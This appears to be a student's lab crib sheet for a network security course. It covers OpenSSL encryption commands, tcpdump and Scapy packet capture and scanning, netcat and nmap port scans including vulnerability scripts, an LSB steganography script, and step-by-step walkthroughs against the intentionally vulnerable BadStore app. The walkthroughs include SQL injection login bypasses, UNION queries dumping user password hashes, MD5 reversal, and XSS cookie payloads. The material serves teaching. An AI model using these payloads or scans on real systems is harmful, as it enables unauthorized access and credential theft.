4)
gedit plain.txt
openssl enc -aes-128-cbc -e -in plain.txt -out cipher.bin -k apple -iv 001122
xxd cipher.bin
openssl enc -aes-128-cbc -d -in cipher.bin -out decrpt.txt -k apple -iv 001122
cat decrpt.txt





5)
openssl enc -aes-128-ecb -in pic_original.bmp -out ecb.bmp -k apple
head -c 54 pic_original.bmp > header
tail -c +55 ecb.bmp > body.ecb
cat header body.ecb > new_ecb.bmp
eog new_ecb.bmp
openssl enc -aes-128-cbc -in pic_original.bmp -out cbc.bmp -k apple -iv 0011223344556677
head -c 54 pic_original.bmp > header
tail -c +55 cbc.bmp > body.cbc
cat header body.cbc > new_cbc.bmp
eog new_cbc.bmp




7
# 1. Create a plaintext file
touch plain.txt
gedit plain.txt     # Write some text in plain.txt and save it

# 2. Encrypt using AES-128-ECB
openssl enc -aes-128-ecb -e -in plain.txt -out cipher_ecb.bin -K 0123456789abcdeffedcba9876543210

# 3. View the ciphertext in hex (optional) change one byte
ghex cipher_ecb.bin
 
# 4. Decrypt ECB ciphertext
openssl enc -aes-128-ecb -d -in cipher_ecb.bin -out op_ecb.txt -K 0123456789abcdeffedcba9876543210

# 5. Encrypt using AES-128-CBC
openssl enc -aes-128-cbc -e -in plain.txt -out cipher_cbc.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff

# 6. View the CBC ciphertext in hex (optional) change one byte
ghex cipher_cbc.bin

# 7. Decrypt CBC ciphertext
openssl enc -aes-128-cbc -d -in cipher_cbc.bin -out op_cbc.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff

# 8. View decrypted output
cat op_ecb.txt
cat op_cbc.txt

part b
echo "THIS IS SAMPLE DATA FOR AES IV TEST" > abc.txt
iv1
openssl enc -aes-128-cbc -e -in abc.txt -out cipher_iv1.bin -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
xxd cipher_iv1.bin
iv2 same key
openssl enc -aes-128-cbc -e -in abc.txt -out cipher_iv2.bin -K 00112233445566778899AABBCCDDEEFF -iv 1112131415161718191A1B1C1D1E1F20
xxd cipher_iv2.bin
decrpyt iv1
openssl enc -aes-128-cbc -d -in cipher_iv1.bin -out dec_iv1.txt -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
cat dec_iv1.txt
openssl enc -aes-128-cbc -d -in cipher_iv2.bin -out dec_iv2.txt -K 00112233445566778899AABBCCDDEEFF -iv 1112131415161718191A1B1C1D1E1F20
cat dec_iv2.txt









6)
echo -n 12345 > f1.txt
echo -n 1234567890 > f2.txt
echo -n 1234567890abcdef > f3.txt

ls -l f*.txt

openssl enc -aes-128-cbc -e -in f1.txt -out f1.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f1.bin -out f1_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f1.bin -out f1_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
xxd f1_dec.txt
xxd f1_nopad.txt

openssl enc -aes-128-cbc -e -in f2.txt -out f2.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f2.bin -out f2_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f2.bin -out f2_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
xxd f2_dec.txt
xxd f2_nopad.txt

openssl enc -aes-128-cbc -e -in f3.txt -out f3.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f3.bin -out f3_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
openssl enc -aes-128-cbc -d -in f3.bin -out f3_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
xxd f3_dec.txt
xxd f3_nopad.txt




8)
1️⃣ Generate RSA Private Key (2048-bit)
openssl genrsa -out key.pri 2048
2️⃣ Generate Public Key from Private Key
openssl rsa -in key.pri -out key.pub -pubout
3️⃣ View Private Key Details (Optional)
openssl rsa -in key.pri -noout -text
4️⃣ Encrypt a Message Using Public Key
echo "Hello" > msg.txt
openssl rsautl -encrypt -inkey key.pub -pubin -in msg.txt -out msg.enc
5️⃣ Decrypt the Message Using Private Key
openssl rsautl -decrypt -inkey key.pri -in msg.enc -out msg.dec
cat msg.dec
6️⃣ Generate a Random Secret Key
openssl rand -hex 32 > secret.key
7️⃣ Encrypt the Secret Key Using Public Key
openssl rsautl -encrypt -inkey key.pub -pubin -in secret.key -out secret.key.enc
8️⃣ Decrypt the Secret Key Using Private Key
openssl rsautl -decrypt -inkey key.pri -in secret.key.enc -out secret.key.dec
cat secret.key
cat secret.key.dec












10)

tcpdump -D

sudo tcpdump -i any
Ctrl + C

sudo tcpdump -i any -w capture.pcap
Ctrl + C

# open new terminal
ping google.com
Ctrl + C

# back to first terminal
sudo tcpdump -i any tcp
Ctrl + C

sudo tcpdump -i any icmp
Ctrl + C

sudo tcpdump -i any port 80
Ctrl + C

sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-syn != 0'
Ctrl + C

sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-syn != 0' -w tcpsyn.pcap
Ctrl + C

sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-ack != 0'
Ctrl + C

sudo tcpdump -n -i any 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'
Ctrl + C

sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-fin != 0' -w tcpfin.pcap
Ctrl + C

sudo tcpdump -r capture.pcap

sudo tcpdump -A -r capture.pcap

sudo tcpdump -xx -r capture.pcap

sudo tcpdump -xx -r tcpsyn.pcap

sudo tcpdump -xx -r tcpfin.pcap
 










import numpy as np
from PIL import Image

def Encode(src, message, dest):

    img = Image.open(src, 'r')
    width, height = img.size
    array = np.array(list(img.getdata()))

    # --- FIXED INDENTATION HERE ---
    if img.mode == 'RGB':
        n = 3
    elif img.mode == 'RGBA':
        n = 4
    else:
        raise ValueError("Unsupported image mode. Use RGB or RGBA.")

    total_pixels = array.size // n

    message += "$t3g0"
    b_message = ''.join([format(ord(i), "08b") for i in message])
    req_pixels = len(b_message)

    if req_pixels > total_pixels:
        print("ERROR: Need larger file size")
        return

    index = 0
    for p in range(total_pixels):
        for q in range(0, 3):  # only modify RGB channels
            if index < req_pixels:
                array[p][q] = int(bin(array[p][q])[2:9] + b_message[index], 2)
                index += 1

    array = array.reshape(height, width, n)
    enc_img = Image.fromarray(array.astype('uint8'), img.mode)
    enc_img.save(dest)
    print("Image Encoded Successfully")


def Decode(src):

    img = Image.open(src, 'r')
    array = np.array(list(img.getdata()))

    if img.mode == 'RGB':
        n = 3
    elif img.mode == 'RGBA':
        n = 4
    else:
        raise ValueError("Unsupported image mode.")

    total_pixels = array.size // n

    hidden_bits = ""
    for p in range(total_pixels):
        for q in range(0, 3):
            hidden_bits += bin(array[p][q])[2:][-1]

    # chunk into 8-bit pieces
    hidden_bytes = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]

    message = ""
    for b in hidden_bytes:
        char = chr(int(b, 2))
        message += char
        if message.endswith("$t3g0"):
            break

    if "$t3g0" in message:
        print("Hidden Message:", message[:-5])
    else:
        print("No Hidden Message Found")


def Stego():
    print("--Welcome to $t3g0--")
    print("1: Encode")
    print("2: Decode")

    func = input()

    if func == '1':
        src = input("Enter Source Image Path: ")
        message = input("Enter Message to Hide: ")
        dest = input("Enter Destination Image Path: ")
        print("Encoding...")
        Encode(src, message, dest)

    elif func == '2':
        src = input("Enter Source Image Path: ")
        print("Decoding...")
        Decode(src)

    else:
        print("ERROR: Invalid option chosen")


Stego()









tcp
udp
http
dns
ftp
smtp
ip.addr == 192.168.1.1
tcp.port == 80
tcp.port == 443
frame.len > 1000


send(IP(dst="8.8.8.8")/ICMP(), count=10)
result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)






from scapy.all import *

# Target network
target = "192.168.1.0/24"

# Create and send ARP request
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target), timeout=2)

# Print result
for s, r in ans:
    print(r.psrc, " --> ", r.hwsrc)





from scapy.all import *

def show(pkt):
    if pkt.haslayer(ICMP):
        print(pkt[IP].src, "->", pkt[IP].dst)

sniff(filter="icmp", prn=show)




from scapy.all import *

target = "www.example.com"

for port in range(80, 83):
    resp = sr1(IP(dst=target)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
    
    if resp:
        print("Port", port, "is OPEN")
    else:
        print("Port", port, "is CLOSED")





#!/bin/bash

host="www.example.com"

read -p "Enter the starting port number: " s
read -p "Enter the ending port number: " e

for ((port=$s; port<=$e; port++))
do
    echo "Scanning port $port ---"
    nc -zv -w1 "$host" "$port" 2>&1
done







p1.
(a)
open badstore
login as admin' -- 
change in addressbar -> login to admin
change dropdown to select current users
click do it
copy password of joe@supplier.com
right click on password select google for search
select MD5 
do reverse for password
you can able to see password

come back to badstore
click what's new on left side
add 1 item in cart
click view cart
go to inspect 
storage 
open cookies section copy card id value
go to new tab open urldecoder.org
put value in this and decode 
decode is the output for that


(b)HxDriver drowsiness 

python
from scapy.all import *
packet = Ether()/IP(dst="192.168.1.1")
packet.show()


(c) ubuntu terminal me

sudo nano port_scan.sh
write program :
#!/bin/bash
host="www.example.com" 
read -p "Enter the starting port number: " start_port
read -p "Enter the ending port number: " end_port
for (( port=start_port; port<=end_port; port++ ))
do
    echo "Scanning port $port..."
    nc -zv -w1 "$host" "$port" 2>&1
done

save with ctrl + s
ctrl +x to exit
sudo chmod +x port_scan.sh
./port_scan.sh

after that enter starting port number : 22
ending port number is: 80 
when succeed show the output

p2:

(a)
open badstore
open firefox search address of badstore
go to login -> 
name : joe@supplier.com
password: iforgot
click login
got to left side prevoius order -> open it
type -> ctrl +f 
type 46.95 in left botton search
write the card used values for all 46.95 values in the output.

(b)command prompt me	

sudo scapy or python
>>>from scapy.all import *
>>> packet=sniff(count=10)
>>> packet.summary()
>>> for i in range(10):
	print(packet[i].show())

(c) NetCat-two terminal (ubuntu me)

nc -vlp 1234
nc localhost 1234

p3.

(a)
sudo scapy
>>> from scapy.all import *
>>> result,_ = traceroute(["www.example.com","www.google.com"], maxttl=20)
>>> result.show()


(b)
nc example.com 80
HEAD / HTTP/1.1
HOST: example.com

nc example.com 80
GET / HTTP/1.1
HOST: example.com

(c)
open zenmap in windows
type in command section
>> nmap -sn google.com   (for ping scan)
>>nmap -sn ip address   (for single scan)

p4.
(a)
open command prompt in window 
>> scapy

then write this below code 

from scapy.all import *

# 1. Define the target
target_subnet = "192.168.1.0/24"

# 2. Send the ARP request and collect answers
answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False)

# 3. Print the results
for sent, received in answered:
    print(f"Host Up: {received.psrc} MAC: {received.hwsrc}")

(b)
>> nc -l -p 5000
go to browser firefox and search -> localhost:5000
come back to terminal
HTTP/1.1 200 OK
Content-Type: text/plain
Connection: close

hello world	
ctrl+c
got to browser see that msz.	

(c)
nmap 192.168.1.101-120   (for range scan)
nmap 192.168.1.0/24  (for subnetting)

p5.
(a)
open badstore 
click what's new add item to cart
go to search left side
<script>alert(document.cookie)</script>
enter -> ouput is card id

(b)
sudo nano port_scan.sh

#!/bin/bash
host="www.example.com"
read -p "Enter starting port: " start_port
read -p "Enter ending port: " end_port

for (( port=start_port; port<=end_port; port++ ))
do
    echo "Scanning port $port..."
    nc -zv -w1 "$host" "$port" 2>&1
done

ctrl+x 

sudo chmod +x port_scan.sh
./port_scan.sh

enter starting port number: 22
enter ending port number: 80

(c)
nmap 192.168.56.1
nmap www.google.com

nmap -sV 192.168.56.1
nmap -sV www.google.com


p6.

(a)
open badstore 
click what's new add item to cart
go to search left side
<script>alert(document.cookie)</script>
enter -> ouput is card id

(b)
nmap -O 192.168.56.1
nmap -O bnmit.org

nmap -A 192.168.56.1
nmap -A google.com

(c)
open badstore
admin login
search -> inspect -> remove maxlength
then search -> xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 -- 
copy admin password and right click and search for google 
open MD5 -> reverse -> below you can able to see password for that

come back at badstore -> now login with admin with using password secret
go to address bar change -> login -> admin
in drop down menu select add user
click do it
inspect that page from blank area
ctrl + f
search hidden in inspect part
you can able to see the hidden password field
this is the output to show ..

p7.
(a)
open cmd in windows
>> scapy
>>from scapy.all import *
>>packet=IP(dst="8.8.8.8")/ICMP()
>>send(packet)

open wireshark 
stop
search icmp

(b)
go to browser and open wikipdedia image in new tab and copyimage link
open terminal
>> nc -l -p 5000

go to browser firefox and search -> localhost:5000

come back to terminal

>> HTTP/1.1 200 OK
>> Content-Type- text/html; charset=UTF-8
>> server: nooblinux

<!doctype html>
<title>bnm</title>
<h1>cars</h1>
<img src="copy link">

(c)
open badstore
login joe@supplier.com in login/register section
search left side -> x
copy sql query till itemdb
paste it in search left side-> add : x' union (paste query) -- 
open inspect of searchbar
remove maxlength
again write in searchbar -> x' union SELECT count(itemnum), count(itemum), count(itemnum), count(price) FROM itemdb -- 

show the output quantity of table item in cart....

p8.
(a)
from scapy.all import *
>>> target_ip="192.168.2.31"
>>> ports = [22, 80, 443]
>>> for port in ports:
...:     packet = IP(dst=target_ip)/TCP(dport=port,flags="S")
...:     response=sr1(packet,timeout=1,verbose=0)
...:     if response:
...:         if response[TCP].flags=="SA":
...:             print(f"Port {port} is open")
...:         elif response[TCP].flags=="RA":
...:             print(f"Port {port} is closed")

(b)
nmap --script vuln google.com
nmap --script vuln 192.168.56.1
nmap -oN output.txt --script vuln 192.168.56.1

(c)
open badstore 
login -> admin' -- 
click login
select current user -> click do it
copy joe@supplier.com password 
right -> search in google -> open first site MD5 one -> check password

come back in badstore -> click supplier login
name : joe@supplier.com
password : iforgot ( or which on u got in the MD5)
show the answer of upload price list


p9.
(a)
go to browser and open wikipdedia image in new tab and copyimage link
open terminal
>> nc -l -p 5000

go to browser firefox and search -> localhost:5000

come back to terminal

>> HTTP/1.1 200 OK
>> Content-Type- text/html; charset=UTF-8
>> server: nooblinux

<!doctype html>
<title>bnm</title>
<h1>cars</h1>
<img src="copy link">

(b)
nmap 192.168.1.101-120   (for range scan)
nmap 192.168.1.0/24  (for subnetting)

(c)
open badstore
open firefox search address of badstore
go to login -> 
name : joe@supplier.com
password: iforgot
click login
got to left side prevoius order -> open it
type -> ctrl +f 
type 46.95 in left botton search
write the card used values for all 46.95 values in the output.

p10.
(a)
from scapy.all import *
def packet_callback(packet):
     if packet[IP].proto==1:
         print(f"ICMP packet from {packet[IP].src}")
sniff(prn=packet_callback,filter="icmp",store=0)

(b)
nmap 192.168.56.1
nmap www.google.com

nmap -sV 192.168.56.1
nmap -sV www.google.com

(c)
open badstore
as admin login
go to addressbar and change "login -> admin"
in drag drop select current users
click do it
click ctrl+f
type in bottom left search -> whole.biz
and show the name of that ids as output...



p11.
(a)
open command prompt in window 
>> scapy

then write this below code 

from scapy.all import *

# 1. Define the target
target_subnet = "192.168.1.0/24"

# 2. Send the ARP request and collect answers
answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False)

# 3. Print the results
for sent, received in answered:
    print(f"Host Up: {received.psrc} MAC: {received.hwsrc}")

(b)
go to browser and open wikipdedia image in new tab and copyimage link
open terminal
>> nc -l -p 5000

go to browser firefox and search -> localhost:5000

come back to terminal

>> HTTP/1.1 200 OK
>> Content-Type- text/html; charset=UTF-8
>> server: nooblinux

<!doctype html>
<title>bnm</title>
<h1>cars</h1>
<img src="copy link">

(c)
open badstore and login as admin or supplier 
then search left side searchbar -> <script>alert(document.cookie)</script>
show the output as cartid and value of that.


p12.
(a)
sudo scapy
>>> from scapy.all import *
>>> result,_ = traceroute(["www.example.com","www.google.com"], maxttl=20)
>>> result.show()

(b)
go to browser and open wikipdedia image in new tab and copyimage link
open terminal
>> nc -l -p 5000

go to browser firefox and search -> localhost:5000

come back to terminal

>> HTTP/1.1 200 OK
>> Content-Type- text/html; charset=UTF-8
>> server: nooblinux

<!doctype html>
<title>bnm</title>
<h1>cars</h1>
<img src="copy link">

(c)
open badstore 
click what's new add item to cart
go to search left side
<script>alert(document.cookie)</script>
enter -> ouput is card id




x' union SELECT itemnum, sdesc, ldesc, price FROM itemdb --
x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb --
xx' IN(itemnum,sdesc,ldesc) UNION select email,passwd,123,123 from userdb LIMIT 2 --
